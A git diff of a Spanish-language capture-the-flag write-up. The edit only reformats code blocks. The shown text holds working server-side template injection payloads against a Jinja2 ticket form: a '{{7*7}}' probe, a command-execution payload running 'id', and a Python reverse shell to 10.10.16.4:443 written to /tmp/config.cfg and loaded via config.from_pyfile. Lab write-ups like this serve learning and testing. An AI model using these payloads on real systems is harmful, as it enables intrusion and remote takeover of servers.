@@ -168,9 +168,7 @@ Si intento crear un ticket con el siguiente payload "{{7*7}}" obtengo 49
 
 Usare el siguiente payload para ver si tengo RCE.
 
-```python
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
-```
+>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 
 La respuesta es la siguiente:
 
@@ -178,14 +176,10 @@ La respuesta es la siguiente:
 
 Me temo que estoy en un contenedor... Voy a intentar establecerme una revshell.
 
-```python
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/config.cfg', 'w').write('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') }}
-```
 
-```python
-{{ config.from_pyfile('/tmp/config.cfg') }}
-```
+> {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/config.cfg', 'w').write('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') }}
 
+> {{ config.from_pyfile('/tmp/config.cfg') }}
 
 ### Enumeración de sistema
 
